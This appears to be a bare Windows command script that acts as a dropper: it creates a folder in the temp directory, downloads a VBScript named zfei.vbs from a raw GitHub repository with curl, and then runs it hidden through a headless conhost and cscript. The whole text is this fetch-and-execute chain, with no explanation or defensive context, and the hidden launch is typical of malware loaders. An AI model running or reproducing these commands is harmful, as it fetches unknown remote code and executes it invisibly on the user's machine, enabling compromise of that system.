cd /d %temp%
mkdir %temp%\owd
curl -v -o %temp%\owd\zfei.vbs -G https://raw.githubusercontent.com/crmdevtest/broskiboyrepo/main/zfei.vbs
conhost.exe --headless cscript %temp%\owd\zfei.vbs
